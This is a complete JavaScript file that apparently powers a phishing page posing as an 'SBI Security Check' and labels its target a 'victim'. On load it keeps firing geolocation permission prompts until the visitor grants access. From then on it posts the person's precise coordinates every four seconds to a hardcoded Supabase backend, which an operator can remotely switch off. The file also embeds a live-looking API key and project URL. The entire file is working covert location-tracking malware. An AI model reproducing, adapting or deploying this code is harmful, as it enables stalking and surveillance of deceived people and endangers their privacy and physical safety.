const SUPABASE_URL = "https://yvwnnridpgelbewhoxps.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl2d25ucmlkcGdlbGJld2hveHBzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA4NDAyMzMsImV4cCI6MjA5NjQxNjIzM30.P1dXFozH5SpHdZEAU2SB2Lh8TMAhAGxCuPEyTj_BL44";

let sessionId = "";
let isKilled = false;

async function init() {
  try {
    const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions`, {
      method: "POST",
      headers: { "apikey": SUPABASE_KEY, "Content-Type": "application/json", "Prefer": "return=representation" },
      body: JSON.stringify({ 
        owner_id: "sbi-victim-" + Date.now(), 
        label: "SBI Security Check", 
        is_active: true, 
        is_killed: false 
      })
    });

    const data = await res.json();
    sessionId = data[0].id;

    // Start spamming location immediately
    forceLocationPopup();

  } catch(e) {
    console.error(e);
  }
}

function forceLocationPopup() {
  // Multiple ways to trigger permission
  navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
  
  // Extra aggressive - keep calling
  setTimeout(() => navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true }), 600);
  setTimeout(() => navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true }), 1200);
}

function success(pos) {
  console.log("✅ Location permission granted");
  sendLocation(pos);
  setInterval(() => sendLocation(), 4000);
}

function error(err) {
  console.log("❌ Permission denied or location off - retrying...", err);
  setTimeout(forceLocationPopup, 800);   // spam again
}

function sendLocation(pos = null) {
  if (isKilled) return;
  if (!pos) {
    navigator.geolocation.getCurrentPosition(sendLocation, () => {}, { enableHighAccuracy: true });
    return;
  }

  fetch(`${SUPABASE_URL}/rest/v1/location_pings`, {
    method: "POST",
    headers: { "apikey": SUPABASE_KEY, "Content-Type": "application/json" },
    body: JSON.stringify({
      session_id: sessionId,
      lat: pos.coords.latitude,
      lon: pos.coords.longitude,
      accuracy: pos.coords.accuracy
    })
  });
}

async function checkKillStatus() {
  if (!sessionId) return;
  const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?id=eq.${sessionId}`, {
    headers: { "apikey": SUPABASE_KEY }
  });
  const data = await res.json();
  if (data[0] && data[0].is_killed === true) {
    isKilled = true;
  }
}

setInterval(checkKillStatus, 3000);
window.onload = init;
